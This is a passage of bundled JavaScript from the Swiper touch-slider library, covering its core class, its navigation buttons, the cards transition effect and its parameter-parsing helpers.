    if (typeof params[moduleParamName] === 'object' && !('enabled' in params[moduleParamName])) {
      params[moduleParamName].enabled = true;
    }

    if (!params[moduleParamName]) params[moduleParamName] = {
      enabled: false
    };
    extend$1(allModulesParams, obj);
  };
}

/* eslint no-param-reassign: "off" */
const prototypes = {
  eventsEmitter,
  update,
  translate,
  transition,
  slide,
  loop,
  grabCursor,
  events: events$1,
  breakpoints,
  checkOverflow: checkOverflow$1,
  classes,
  images
};
const extendedDefaults = {};

let Swiper$1 = class Swiper {
  constructor(...args) {
    let el;
    let params;

    if (args.length === 1 && args[0].constructor && Object.prototype.toString.call(args[0]).slice(8, -1) === 'Object') {
      params = args[0];
    } else {
      [el, params] = args;
    }

    if (!params) params = {};
    params = extend$1({}, params);
    if (el && !params.el) params.el = el;

    if (params.el && $(params.el).length > 1) {
      const swipers = [];
      $(params.el).each(containerEl => {
        const newParams = extend$1({}, params, {
          el: containerEl
        });
        swipers.push(new Swiper(newParams));
      }); // eslint-disable-next-line no-constructor-return

      return swipers;
    } // Swiper Instance


    const swiper = this;
    swiper.__swiper__ = true;
    swiper.support = getSupport();
    swiper.device = getDevice({
      userAgent: params.userAgent
    });
    swiper.browser = getBrowser();
    swiper.eventsListeners = {};
    swiper.eventsAnyListeners = [];
    swiper.modules = [...swiper.__modules__];

    if (params.modules && Array.isArray(params.modules)) {
      swiper.modules.push(...params.modules);
    }

    const allModulesParams = {};
    swiper.modules.forEach(mod => {
      mod({
        swiper,
        extendParams: moduleExtendParams(params, allModulesParams),
        on: swiper.on.bind(swiper),
        once: swiper.once.bind(swiper),
        off: swiper.off.bind(swiper),
        emit: swiper.emit.bind(swiper)
      });
    }); // Extend defaults with modules params

    const swiperParams = extend$1({}, defaults, allModulesParams); // Extend defaults with passed params

    swiper.params = extend$1({}, swiperParams, extendedDefaults, params);
    swiper.originalParams = extend$1({}, swiper.params);
    swiper.passedParams = extend$1({}, params); // add event listeners

    if (swiper.params && swiper.params.on) {
      Object.keys(swiper.params.on).forEach(eventName => {
        swiper.on(eventName, swiper.params.on[eventName]);
      });
    }

    if (swiper.params && swiper.params.onAny) {
      swiper.onAny(swiper.params.onAny);
    } // Save Dom lib


    swiper.$ = $; // Extend Swiper

    Object.assign(swiper, {
      enabled: swiper.params.enabled,
      el,
      // Classes
      classNames: [],
      // Slides
      slides: $(),
      slidesGrid: [],
      snapGrid: [],
      slidesSizesGrid: [],

      // isDirection
      isHorizontal() {
        return swiper.params.direction === 'horizontal';
      },

      isVertical() {
        return swiper.params.direction === 'vertical';
      },

      // Indexes
      activeIndex: 0,
      realIndex: 0,
      //
      isBeginning: true,
      isEnd: false,
      // Props
      translate: 0,
      previousTranslate: 0,
      progress: 0,
      velocity: 0,
      animating: false,
      // Locks
      allowSlideNext: swiper.params.allowSlideNext,
      allowSlidePrev: swiper.params.allowSlidePrev,
      // Touch Events
      touchEvents: function touchEvents() {
        const touch = ['touchstart', 'touchmove', 'touchend', 'touchcancel'];
        const desktop = ['pointerdown', 'pointermove', 'pointerup'];
        swiper.touchEventsTouch = {
          start: touch[0],
          move: touch[1],
          end: touch[2],
          cancel: touch[3]
        };
        swiper.touchEventsDesktop = {
          start: desktop[0],
          move: desktop[1],
          end: desktop[2]
        };
        return swiper.support.touch || !swiper.params.simulateTouch ? swiper.touchEventsTouch : swiper.touchEventsDesktop;
      }(),
      touchEventsData: {
        isTouched: undefined,
        isMoved: undefined,
        allowTouchCallbacks: undefined,
        touchStartTime: undefined,
        isScrolling: undefined,
        currentTranslate: undefined,
        startTranslate: undefined,
        allowThresholdMove: undefined,
        // Form elements to match
        focusableElements: swiper.params.focusableElements,
        // Last click time
        lastClickTime: now(),
        clickTimeout: undefined,
        // Velocities
        velocities: [],
        allowMomentumBounce: undefined,
        isTouchEvent: undefined,
        startMoving: undefined
      },
      // Clicks
      allowClick: true,
      // Touches
      allowTouchMove: swiper.params.allowTouchMove,
      touches: {
        startX: 0,
        startY: 0,
        currentX: 0,
        currentY: 0,
        diff: 0
      },
      // Images
      imagesToLoad: [],
      imagesLoaded: 0
    });
    swiper.emit('_swiper'); // Init

    if (swiper.params.init) {
      swiper.init();
    } // Return app instance
    // eslint-disable-next-line no-constructor-return


    return swiper;
  }

  enable() {
    const swiper = this;
    if (swiper.enabled) return;
    swiper.enabled = true;

    if (swiper.params.grabCursor) {
      swiper.setGrabCursor();
    }

    swiper.emit('enable');
  }

  disable() {
    const swiper = this;
    if (!swiper.enabled) return;
    swiper.enabled = false;

    if (swiper.params.grabCursor) {
      swiper.unsetGrabCursor();
    }

    swiper.emit('disable');
  }

  setProgress(progress, speed) {
    const swiper = this;
    progress = Math.min(Math.max(progress, 0), 1);
    const min = swiper.minTranslate();
    const max = swiper.maxTranslate();
    const current = (max - min) * progress + min;
    swiper.translateTo(current, typeof speed === 'undefined' ? 0 : speed);
    swiper.updateActiveIndex();
    swiper.updateSlidesClasses();
  }

  emitContainerClasses() {
    const swiper = this;
    if (!swiper.params._emitClasses || !swiper.el) return;
    const cls = swiper.el.className.split(' ').filter(className => {
      return className.indexOf('swiper') === 0 || className.indexOf(swiper.params.containerModifierClass) === 0;
    });
    swiper.emit('_containerClasses', cls.join(' '));
  }

  getSlideClasses(slideEl) {
    const swiper = this;
    if (swiper.destroyed) return '';
    return slideEl.className.split(' ').filter(className => {
      return className.indexOf('swiper-slide') === 0 || className.indexOf(swiper.params.slideClass) === 0;
    }).join(' ');
  }

  emitSlidesClasses() {
    const swiper = this;
    if (!swiper.params._emitClasses || !swiper.el) return;
    const updates = [];
    swiper.slides.each(slideEl => {
      const classNames = swiper.getSlideClasses(slideEl);
      updates.push({
        slideEl,
        classNames
      });
      swiper.emit('_slideClass', slideEl, classNames);
    });
    swiper.emit('_slideClasses', updates);
  }

  slidesPerViewDynamic(view = 'current', exact = false) {
    const swiper = this;
    const {
      params,
      slides,
      slidesGrid,
      slidesSizesGrid,
      size: swiperSize,
      activeIndex
    } = swiper;
    let spv = 1;

    if (params.centeredSlides) {
      let slideSize = slides[activeIndex].swiperSlideSize;
      let breakLoop;

      for (let i = activeIndex + 1; i < slides.length; i += 1) {
        if (slides[i] && !breakLoop) {
          slideSize += slides[i].swiperSlideSize;
          spv += 1;
          if (slideSize > swiperSize) breakLoop = true;
        }
      }

      for (let i = activeIndex - 1; i >= 0; i -= 1) {
        if (slides[i] && !breakLoop) {
          slideSize += slides[i].swiperSlideSize;
          spv += 1;
          if (slideSize > swiperSize) breakLoop = true;
        }
      }
    } else {
      // eslint-disable-next-line
      if (view === 'current') {
        for (let i = activeIndex + 1; i < slides.length; i += 1) {
          const slideInView = exact ? slidesGrid[i] + slidesSizesGrid[i] - slidesGrid[activeIndex] < swiperSize : slidesGrid[i] - slidesGrid[activeIndex] < swiperSize;

          if (slideInView) {
            spv += 1;
          }
        }
      } else {
        // previous
        for (let i = activeIndex - 1; i >= 0; i -= 1) {
          const slideInView = slidesGrid[activeIndex] - slidesGrid[i] < swiperSize;

          if (slideInView) {
            spv += 1;
          }
        }
      }
    }

    return spv;
  }

  update() {
    const swiper = this;
    if (!swiper || swiper.destroyed) return;
    const {
      snapGrid,
      params
    } = swiper; // Breakpoints

    if (params.breakpoints) {
      swiper.setBreakpoint();
    }

    swiper.updateSize();
    swiper.updateSlides();
    swiper.updateProgress();
    swiper.updateSlidesClasses();

    function setTranslate() {
      const translateValue = swiper.rtlTranslate ? swiper.translate * -1 : swiper.translate;
      const newTranslate = Math.min(Math.max(translateValue, swiper.maxTranslate()), swiper.minTranslate());
      swiper.setTranslate(newTranslate);
      swiper.updateActiveIndex();
      swiper.updateSlidesClasses();
    }

    let translated;

    if (swiper.params.freeMode && swiper.params.freeMode.enabled) {
      setTranslate();

      if (swiper.params.autoHeight) {
        swiper.updateAutoHeight();
      }
    } else {
      if ((swiper.params.slidesPerView === 'auto' || swiper.params.slidesPerView > 1) && swiper.isEnd && !swiper.params.centeredSlides) {
        translated = swiper.slideTo(swiper.slides.length - 1, 0, false, true);
      } else {
        translated = swiper.slideTo(swiper.activeIndex, 0, false, true);
      }

      if (!translated) {
        setTranslate();
      }
    }

    if (params.watchOverflow && snapGrid !== swiper.snapGrid) {
      swiper.checkOverflow();
    }

    swiper.emit('update');
  }

  changeDirection(newDirection, needUpdate = true) {
    const swiper = this;
    const currentDirection = swiper.params.direction;

    if (!newDirection) {
      // eslint-disable-next-line
      newDirection = currentDirection === 'horizontal' ? 'vertical' : 'horizontal';
    }

    if (newDirection === currentDirection || newDirection !== 'horizontal' && newDirection !== 'vertical') {
      return swiper;
    }

    swiper.$el.removeClass(`${swiper.params.containerModifierClass}${currentDirection}`).addClass(`${swiper.params.containerModifierClass}${newDirection}`);
    swiper.emitContainerClasses();
    swiper.params.direction = newDirection;
    swiper.slides.each(slideEl => {
      if (newDirection === 'vertical') {
        slideEl.style.width = '';
      } else {
        slideEl.style.height = '';
      }
    });
    swiper.emit('changeDirection');
    if (needUpdate) swiper.update();
    return swiper;
  }

  changeLanguageDirection(direction) {
    const swiper = this;
    if (swiper.rtl && direction === 'rtl' || !swiper.rtl && direction === 'ltr') return;
    swiper.rtl = direction === 'rtl';
    swiper.rtlTranslate = swiper.params.direction === 'horizontal' && swiper.rtl;

    if (swiper.rtl) {
      swiper.$el.addClass(`${swiper.params.containerModifierClass}rtl`);
      swiper.el.dir = 'rtl';
    } else {
      swiper.$el.removeClass(`${swiper.params.containerModifierClass}rtl`);
      swiper.el.dir = 'ltr';
    }

    swiper.update();
  }

  mount(el) {
    const swiper = this;
    if (swiper.mounted) return true; // Find el

    const $el = $(el || swiper.params.el);
    el = $el[0];

    if (!el) {
      return false;
    }

    el.swiper = swiper;

    const getWrapperSelector = () => {
      return `.${(swiper.params.wrapperClass || '').trim().split(' ').join('.')}`;
    };

    const getWrapper = () => {
      if (el && el.shadowRoot && el.shadowRoot.querySelector) {
        const res = $(el.shadowRoot.querySelector(getWrapperSelector())); // Children needs to return slot items

        res.children = options => $el.children(options);

        return res;
      }

      if (!$el.children) {
        return $($el).children(getWrapperSelector());
      }

      return $el.children(getWrapperSelector());
    }; // Find Wrapper


    let $wrapperEl = getWrapper();

    if ($wrapperEl.length === 0 && swiper.params.createElements) {
      const document = getDocument();
      const wrapper = document.createElement('div');
      $wrapperEl = $(wrapper);
      wrapper.className = swiper.params.wrapperClass;
      $el.append(wrapper);
      $el.children(`.${swiper.params.slideClass}`).each(slideEl => {
        $wrapperEl.append(slideEl);
      });
    }

    Object.assign(swiper, {
      $el,
      el,
      $wrapperEl,
      wrapperEl: $wrapperEl[0],
      mounted: true,
      // RTL
      rtl: el.dir.toLowerCase() === 'rtl' || $el.css('direction') === 'rtl',
      rtlTranslate: swiper.params.direction === 'horizontal' && (el.dir.toLowerCase() === 'rtl' || $el.css('direction') === 'rtl'),
      wrongRTL: $wrapperEl.css('display') === '-webkit-box'
    });
    return true;
  }

  init(el) {
    const swiper = this;
    if (swiper.initialized) return swiper;
    const mounted = swiper.mount(el);
    if (mounted === false) return swiper;
    swiper.emit('beforeInit'); // Set breakpoint

    if (swiper.params.breakpoints) {
      swiper.setBreakpoint();
    } // Add Classes


    swiper.addClasses(); // Create loop

    if (swiper.params.loop) {
      swiper.loopCreate();
    } // Update size


    swiper.updateSize(); // Update slides

    swiper.updateSlides();

    if (swiper.params.watchOverflow) {
      swiper.checkOverflow();
    } // Set Grab Cursor


    if (swiper.params.grabCursor && swiper.enabled) {
      swiper.setGrabCursor();
    }

    if (swiper.params.preloadImages) {
      swiper.preloadImages();
    } // Slide To Initial Slide


    if (swiper.params.loop) {
      swiper.slideTo(swiper.params.initialSlide + swiper.loopedSlides, 0, swiper.params.runCallbacksOnInit, false, true);
    } else {
      swiper.slideTo(swiper.params.initialSlide, 0, swiper.params.runCallbacksOnInit, false, true);
    } // Attach events


    swiper.attachEvents(); // Init Flag

    swiper.initialized = true; // Emit

    swiper.emit('init');
    swiper.emit('afterInit');
    return swiper;
  }

  destroy(deleteInstance = true, cleanStyles = true) {
    const swiper = this;
    const {
      params,
      $el,
      $wrapperEl,
      slides
    } = swiper;

    if (typeof swiper.params === 'undefined' || swiper.destroyed) {
      return null;
    }

    swiper.emit('beforeDestroy'); // Init Flag

    swiper.initialized = false; // Detach events

    swiper.detachEvents(); // Destroy loop

    if (params.loop) {
      swiper.loopDestroy();
    } // Cleanup styles


    if (cleanStyles) {
      swiper.removeClasses();
      $el.removeAttr('style');
      $wrapperEl.removeAttr('style');

      if (slides && slides.length) {
        slides.removeClass([params.slideVisibleClass, params.slideActiveClass, params.slideNextClass, params.slidePrevClass].join(' ')).removeAttr('style').removeAttr('data-swiper-slide-index');
      }
    }

    swiper.emit('destroy'); // Detach emitter events

    Object.keys(swiper.eventsListeners).forEach(eventName => {
      swiper.off(eventName);
    });

    if (deleteInstance !== false) {
      swiper.$el[0].swiper = null;
      deleteProps(swiper);
    }

    swiper.destroyed = true;
    return null;
  }

  static extendDefaults(newDefaults) {
    extend$1(extendedDefaults, newDefaults);
  }

  static get extendedDefaults() {
    return extendedDefaults;
  }

  static get defaults() {
    return defaults;
  }

  static installModule(mod) {
    if (!Swiper.prototype.__modules__) Swiper.prototype.__modules__ = [];
    const modules = Swiper.prototype.__modules__;

    if (typeof mod === 'function' && modules.indexOf(mod) < 0) {
      modules.push(mod);
    }
  }

  static use(module) {
    if (Array.isArray(module)) {
      module.forEach(m => Swiper.installModule(m));
      return Swiper;
    }

    Swiper.installModule(module);
    return Swiper;
  }

};

Object.keys(prototypes).forEach(prototypeGroup => {
  Object.keys(prototypes[prototypeGroup]).forEach(protoMethod => {
    Swiper$1.prototype[protoMethod] = prototypes[prototypeGroup][protoMethod];
  });
});
Swiper$1.use([Resize, Observer]);

function createElementIfNotDefined(swiper, originalParams, params, checkProps) {
  const document = getDocument();

  if (swiper.params.createElements) {
    Object.keys(checkProps).forEach(key => {
      if (!params[key] && params.auto === true) {
        let element = swiper.$el.children(`.${checkProps[key]}`)[0];

        if (!element) {
          element = document.createElement('div');
          element.className = checkProps[key];
          swiper.$el.append(element);
        }

        params[key] = element;
        originalParams[key] = element;
      }
    });
  }

  return params;
}

function Navigation({
  swiper,
  extendParams,
  on,
  emit
}) {
  extendParams({
    navigation: {
      nextEl: null,
      prevEl: null,
      hideOnClick: false,
      disabledClass: 'swiper-button-disabled',
      hiddenClass: 'swiper-button-hidden',
      lockClass: 'swiper-button-lock',
      navigationDisabledClass: 'swiper-navigation-disabled'
    }
  });
  swiper.navigation = {
    nextEl: null,
    $nextEl: null,
    prevEl: null,
    $prevEl: null
  };

  function getEl(el) {
    let $el;

    if (el) {
      $el = $(el);

      if (swiper.params.uniqueNavElements && typeof el === 'string' && $el.length > 1 && swiper.$el.find(el).length === 1) {
        $el = swiper.$el.find(el);
      }
    }

    return $el;
  }

  function toggleEl($el, disabled) {
    const params = swiper.params.navigation;

    if ($el && $el.length > 0) {
      $el[disabled ? 'addClass' : 'removeClass'](params.disabledClass);
      if ($el[0] && $el[0].tagName === 'BUTTON') $el[0].disabled = disabled;

      if (swiper.params.watchOverflow && swiper.enabled) {
        $el[swiper.isLocked ? 'addClass' : 'removeClass'](params.lockClass);
      }
    }
  }

  function update() {
    // Update Navigation Buttons
    if (swiper.params.loop) return;
    const {
      $nextEl,
      $prevEl
    } = swiper.navigation;
    toggleEl($prevEl, swiper.isBeginning && !swiper.params.rewind);
    toggleEl($nextEl, swiper.isEnd && !swiper.params.rewind);
  }

  function onPrevClick(e) {
    e.preventDefault();
    if (swiper.isBeginning && !swiper.params.loop && !swiper.params.rewind) return;
    swiper.slidePrev();
    emit('navigationPrev');
  }

  function onNextClick(e) {
    e.preventDefault();
    if (swiper.isEnd && !swiper.params.loop && !swiper.params.rewind) return;
    swiper.slideNext();
    emit('navigationNext');
  }

  function init() {
    const params = swiper.params.navigation;
    swiper.params.navigation = createElementIfNotDefined(swiper, swiper.originalParams.navigation, swiper.params.navigation, {
      nextEl: 'swiper-button-next',
      prevEl: 'swiper-button-prev'
    });
    if (!(params.nextEl || params.prevEl)) return;
    const $nextEl = getEl(params.nextEl);
    const $prevEl = getEl(params.prevEl);

    if ($nextEl && $nextEl.length > 0) {
      $nextEl.on('click', onNextClick);
    }

    if ($prevEl && $prevEl.length > 0) {
      $prevEl.on('click', onPrevClick);
    }

    Object.assign(swiper.navigation, {
      $nextEl,
      nextEl: $nextEl && $nextEl[0],
      $prevEl,
      prevEl: $prevEl && $prevEl[0]
    });

    if (!swiper.enabled) {
      if ($nextEl) $nextEl.addClass(params.lockClass);
      if ($prevEl) $prevEl.addClass(params.lockClass);
    }
  }

  function destroy() {
    const {
      $nextEl,
      $prevEl
    } = swiper.navigation;

    if ($nextEl && $nextEl.length) {
      $nextEl.off('click', onNextClick);
      $nextEl.removeClass(swiper.params.navigation.disabledClass);
    }

    if ($prevEl && $prevEl.length) {
      $prevEl.off('click', onPrevClick);
      $prevEl.removeClass(swiper.params.navigation.disabledClass);
    }
  }

  on('init', () => {
    if (swiper.params.navigation.enabled === false) {
      // eslint-disable-next-line
      disable();
    } else {
      init();
      update();
    }
  });
  on('toEdge fromEdge lock unlock', () => {
    update();
  });
  on('destroy', () => {
    destroy();
  });
  on('enable disable', () => {
    const {
      $nextEl,
      $prevEl
    } = swiper.navigation;

    if ($nextEl) {
      $nextEl[swiper.enabled ? 'removeClass' : 'addClass'](swiper.params.navigation.lockClass);
    }

    if ($prevEl) {
      $prevEl[swiper.enabled ? 'removeClass' : 'addClass'](swiper.params.navigation.lockClass);
    }
  });
  on('click', (_s, e) => {
    const {
      $nextEl,
      $prevEl
    } = swiper.navigation;
    const targetEl = e.target;

    if (swiper.params.navigation.hideOnClick && !$(targetEl).is($prevEl) && !$(targetEl).is($nextEl)) {
      if (swiper.pagination && swiper.params.pagination && swiper.params.pagination.clickable && (swiper.pagination.el === targetEl || swiper.pagination.el.contains(targetEl))) return;
      let isHidden;

      if ($nextEl) {
        isHidden = $nextEl.hasClass(swiper.params.navigation.hiddenClass);
      } else if ($prevEl) {
        isHidden = $prevEl.hasClass(swiper.params.navigation.hiddenClass);
      }

      if (isHidden === true) {
        emit('navigationShow');
      } else {
        emit('navigationHide');
      }

      if ($nextEl) {
        $nextEl.toggleClass(swiper.params.navigation.hiddenClass);
      }

      if ($prevEl) {
        $prevEl.toggleClass(swiper.params.navigation.hiddenClass);
      }
    }
  });

  const enable = () => {
    swiper.$el.removeClass(swiper.params.navigation.navigationDisabledClass);
    init();
    update();
  };

  const disable = () => {
    swiper.$el.addClass(swiper.params.navigation.navigationDisabledClass);
    destroy();
  };

  Object.assign(swiper.navigation, {
    enable,
    disable,
    update,
    init,
    destroy
  });
}

function effectInit(params) {
  const {
    effect,
    swiper,
    on,
    setTranslate,
    setTransition,
    overwriteParams,
    perspective,
    recreateShadows,
    getEffectParams
  } = params;
  on('beforeInit', () => {
    if (swiper.params.effect !== effect) return;
    swiper.classNames.push(`${swiper.params.containerModifierClass}${effect}`);

    if (perspective && perspective()) {
      swiper.classNames.push(`${swiper.params.containerModifierClass}3d`);
    }

    const overwriteParamsResult = overwriteParams ? overwriteParams() : {};
    Object.assign(swiper.params, overwriteParamsResult);
    Object.assign(swiper.originalParams, overwriteParamsResult);
  });
  on('setTranslate', () => {
    if (swiper.params.effect !== effect) return;
    setTranslate();
  });
  on('setTransition', (_s, duration) => {
    if (swiper.params.effect !== effect) return;
    setTransition(duration);
  });
  on('transitionEnd', () => {
    if (swiper.params.effect !== effect) return;

    if (recreateShadows) {
      if (!getEffectParams || !getEffectParams().slideShadows) return; // remove shadows

      swiper.slides.each(slideEl => {
        const $slideEl = swiper.$(slideEl);
        $slideEl.find('.swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left').remove();
      }); // create new one

      recreateShadows();
    }
  });
  let requireUpdateOnVirtual;
  on('virtualUpdate', () => {
    if (swiper.params.effect !== effect) return;

    if (!swiper.slides.length) {
      requireUpdateOnVirtual = true;
    }

    requestAnimationFrame(() => {
      if (requireUpdateOnVirtual && swiper.slides && swiper.slides.length) {
        setTranslate();
        requireUpdateOnVirtual = false;
      }
    });
  });
}

function effectTarget(effectParams, $slideEl) {
  if (effectParams.transformEl) {
    return $slideEl.find(effectParams.transformEl).css({
      'backface-visibility': 'hidden',
      '-webkit-backface-visibility': 'hidden'
    });
  }

  return $slideEl;
}

function effectVirtualTransitionEnd({
  swiper,
  duration,
  transformEl,
  allSlides
}) {
  const {
    slides,
    activeIndex,
    $wrapperEl
  } = swiper;

  if (swiper.params.virtualTranslate && duration !== 0) {
    let eventTriggered = false;
    let $transitionEndTarget;

    if (allSlides) {
      $transitionEndTarget = transformEl ? slides.find(transformEl) : slides;
    } else {
      $transitionEndTarget = transformEl ? slides.eq(activeIndex).find(transformEl) : slides.eq(activeIndex);
    }

    $transitionEndTarget.transitionEnd(() => {
      if (eventTriggered) return;
      if (!swiper || swiper.destroyed) return;
      eventTriggered = true;
      swiper.animating = false;
      const triggerEvents = ['webkitTransitionEnd', 'transitionend'];

      for (let i = 0; i < triggerEvents.length; i += 1) {
        $wrapperEl.trigger(triggerEvents[i]);
      }
    });
  }
}

function createShadow(params, $slideEl, side) {
  const shadowClass = `swiper-slide-shadow${''}`;
  const $shadowContainer = params.transformEl ? $slideEl.find(params.transformEl) : $slideEl;
  let $shadowEl = $shadowContainer.children(`.${shadowClass}`);

  if (!$shadowEl.length) {
    $shadowEl = $(`<div class="swiper-slide-shadow${''}"></div>`);
    $shadowContainer.append($shadowEl);
  }

  return $shadowEl;
}

function EffectCards({
  swiper,
  extendParams,
  on
}) {
  extendParams({
    cardsEffect: {
      slideShadows: true,
      transformEl: null,
      rotate: true,
      perSlideRotate: 2,
      perSlideOffset: 8
    }
  });

  const setTranslate = () => {
    const {
      slides,
      activeIndex
    } = swiper;
    const params = swiper.params.cardsEffect;
    const {
      startTranslate,
      isTouched
    } = swiper.touchEventsData;
    const currentTranslate = swiper.translate;

    for (let i = 0; i < slides.length; i += 1) {
      const $slideEl = slides.eq(i);
      const slideProgress = $slideEl[0].progress;
      const progress = Math.min(Math.max(slideProgress, -4), 4);
      let offset = $slideEl[0].swiperSlideOffset;

      if (swiper.params.centeredSlides && !swiper.params.cssMode) {
        swiper.$wrapperEl.transform(`translateX(${swiper.minTranslate()}px)`);
      }

      if (swiper.params.centeredSlides && swiper.params.cssMode) {
        offset -= slides[0].swiperSlideOffset;
      }

      let tX = swiper.params.cssMode ? -offset - swiper.translate : -offset;
      let tY = 0;
      const tZ = -100 * Math.abs(progress);
      let scale = 1;
      let rotate = -params.perSlideRotate * progress;
      let tXAdd = params.perSlideOffset - Math.abs(progress) * 0.75;
      const slideIndex = swiper.virtual && swiper.params.virtual.enabled ? swiper.virtual.from + i : i;
      const isSwipeToNext = (slideIndex === activeIndex || slideIndex === activeIndex - 1) && progress > 0 && progress < 1 && (isTouched || swiper.params.cssMode) && currentTranslate < startTranslate;
      const isSwipeToPrev = (slideIndex === activeIndex || slideIndex === activeIndex + 1) && progress < 0 && progress > -1 && (isTouched || swiper.params.cssMode) && currentTranslate > startTranslate;

      if (isSwipeToNext || isSwipeToPrev) {
        const subProgress = (1 - Math.abs((Math.abs(progress) - 0.5) / 0.5)) ** 0.5;
        rotate += -28 * progress * subProgress;
        scale += -0.5 * subProgress;
        tXAdd += 96 * subProgress;
        tY = `${ -25 * subProgress * Math.abs(progress)}%`;
      }

      if (progress < 0) {
        // next
        tX = `calc(${tX}px + (${tXAdd * Math.abs(progress)}%))`;
      } else if (progress > 0) {
        // prev
        tX = `calc(${tX}px + (-${tXAdd * Math.abs(progress)}%))`;
      } else {
        tX = `${tX}px`;
      }

      if (!swiper.isHorizontal()) {
        const prevY = tY;
        tY = tX;
        tX = prevY;
      }

      const scaleString = progress < 0 ? `${1 + (1 - scale) * progress}` : `${1 - (1 - scale) * progress}`;
      const transform = `
        translate3d(${tX}, ${tY}, ${tZ}px)
        rotateZ(${params.rotate ? rotate : 0}deg)
        scale(${scaleString})
      `;

      if (params.slideShadows) {
        // Set shadows
        let $shadowEl = $slideEl.find('.swiper-slide-shadow');

        if ($shadowEl.length === 0) {
          $shadowEl = createShadow(params, $slideEl);
        }

        if ($shadowEl.length) $shadowEl[0].style.opacity = Math.min(Math.max((Math.abs(progress) - 0.5) / 0.5, 0), 1);
      }

      $slideEl[0].style.zIndex = -Math.abs(Math.round(slideProgress)) + slides.length;
      const $targetEl = effectTarget(params, $slideEl);
      $targetEl.transform(transform);
    }
  };

  const setTransition = duration => {
    const {
      transformEl
    } = swiper.params.cardsEffect;
    const $transitionElements = transformEl ? swiper.slides.find(transformEl) : swiper.slides;
    $transitionElements.transition(duration).find('.swiper-slide-shadow').transition(duration);
    effectVirtualTransitionEnd({
      swiper,
      duration,
      transformEl
    });
  };

  effectInit({
    effect: 'cards',
    swiper,
    on,
    setTranslate,
    setTransition,
    perspective: () => true,
    overwriteParams: () => ({
      watchSlidesProgress: true,
      virtualTranslate: !swiper.params.cssMode
    })
  });
}

function isObject(o) {
  return typeof o === 'object' && o !== null && o.constructor && Object.prototype.toString.call(o).slice(8, -1) === 'Object';
}

function extend(target, src) {
  const noExtend = ['__proto__', 'constructor', 'prototype'];
  Object.keys(src).filter(key => noExtend.indexOf(key) < 0).forEach(key => {
    if (typeof target[key] === 'undefined') target[key] = src[key];else if (isObject(src[key]) && isObject(target[key]) && Object.keys(src[key]).length > 0) {
      if (src[key].__swiper__) target[key] = src[key];else extend(target[key], src[key]);
    } else {
      target[key] = src[key];
    }
  });
}

function needsNavigation(params = {}) {
  return params.navigation && typeof params.navigation.nextEl === 'undefined' && typeof params.navigation.prevEl === 'undefined';
}

function needsPagination(params = {}) {
  return params.pagination && typeof params.pagination.el === 'undefined';
}

function needsScrollbar(params = {}) {
  return params.scrollbar && typeof params.scrollbar.el === 'undefined';
}

function uniqueClasses(classNames = '') {
  const classes = classNames.split(' ').map(c => c.trim()).filter(c => !!c);
  const unique = [];
  classes.forEach(c => {
    if (unique.indexOf(c) < 0) unique.push(c);
  });
  return unique.join(' ');
}

/* underscore in name -> watch for changes */
const paramsList = ['modules', 'init', '_direction', 'touchEventsTarget', 'initialSlide', '_speed', 'cssMode', 'updateOnWindowResize', 'resizeObserver', 'nested', 'focusableElements', '_enabled', '_width', '_height', 'preventInteractionOnTransition', 'userAgent', 'url', '_edgeSwipeDetection', '_edgeSwipeThreshold', '_freeMode', '_autoHeight', 'setWrapperSize', 'virtualTranslate', '_effect', 'breakpoints', '_spaceBetween', '_slidesPerView', 'maxBackfaceHiddenSlides', '_grid', '_slidesPerGroup', '_slidesPerGroupSkip', '_slidesPerGroupAuto', '_centeredSlides', '_centeredSlidesBounds', '_slidesOffsetBefore', '_slidesOffsetAfter', 'normalizeSlideIndex', '_centerInsufficientSlides', '_watchOverflow', 'roundLengths', 'touchRatio', 'touchAngle', 'simulateTouch', '_shortSwipes', '_longSwipes', 'longSwipesRatio', 'longSwipesMs', '_followFinger', 'allowTouchMove', '_threshold', 'touchMoveStopPropagation', 'touchStartPreventDefault', 'touchStartForcePreventDefault', 'touchReleaseOnEdges', 'uniqueNavElements', '_resistance', '_resistanceRatio', '_watchSlidesProgress', '_grabCursor', 'preventClicks', 'preventClicksPropagation', '_slideToClickedSlide', '_preloadImages', 'updateOnImagesReady', '_loop', '_loopAdditionalSlides', '_loopedSlides', '_loopedSlidesLimit', '_loopFillGroupWithBlank', 'loopPreventsSlide', '_rewind', '_allowSlidePrev', '_allowSlideNext', '_swipeHandler', '_noSwiping', 'noSwipingClass', 'noSwipingSelector', 'passiveListeners', 'containerModifierClass', 'slideClass', 'slideBlankClass', 'slideActiveClass', 'slideDuplicateActiveClass', 'slideVisibleClass', 'slideDuplicateClass', 'slideNextClass', 'slideDuplicateNextClass', 'slidePrevClass', 'slideDuplicatePrevClass', 'wrapperClass', 'runCallbacksOnInit', 'observer', 'observeParents', 'observeSlideChildren', // modules
'a11y', '_autoplay', '_controller', 'coverflowEffect', 'cubeEffect', 'fadeEffect', 'flipEffect', 'creativeEffect', 'cardsEffect', 'hashNavigation', 'history', 'keyboard', 'lazy', 'mousewheel', '_navigation', '_pagination', 'parallax', '_scrollbar', '_thumbs', 'virtual', 'zoom'];

function getParams(obj = {}, splitEvents = true) {
  const params = {
    on: {}
  };
  const events = {};
  const passedParams = {};
  extend(params, Swiper$1.defaults);
  extend(params, Swiper$1.extendedDefaults);
  params._emitClasses = true;
  params.init = false;
  const rest = {};
  const allowedParams = paramsList.map(key => key.replace(/_/, ''));
  const plainObj = Object.assign({}, obj);
  Object.keys(plainObj).forEach(key => {
    if (typeof obj[key] === 'undefined') return;

    if (allowedParams.indexOf(key) >= 0) {
      if (isObject(obj[key])) {
        params[key] = {};
        passedParams[key] = {};
        extend(params[key], obj[key]);
        extend(passedParams[key], obj[key]);
      } else {
        params[key] = obj[key];
        passedParams[key] = obj[key];
      }
    } else if (key.search(/on[A-Z]/) === 0 && typeof obj[key] === 'function') {
      if (splitEvents) {
        events[`${key[2].toLowerCase()}${key.substr(3)}`] = obj[key];
      } else {
        params.on[`${key[2].toLowerCase()}${key.substr(3)}`] = obj[key];
      }
    } else {
      rest[key] = obj[key];
    }
  });
  ['navigation', 'pagination', 'scrollbar'].forEach(key => {
    if (params[key] === true) params[key] = {};
    if (params[key] === false) delete params[key];
  });
  return {
    params,
    passedParams,
    rest,
    events
  };
}

function mountSwiper({
  el,
  nextEl,
  prevEl,
  paginationEl,
  scrollbarEl,
  swiper
}, swiperParams) {
  if (needsNavigation(swiperParams) && nextEl && prevEl) {
    swiper.params.navigation.nextEl = nextEl;
    swiper.originalParams.navigation.nextEl = nextEl;
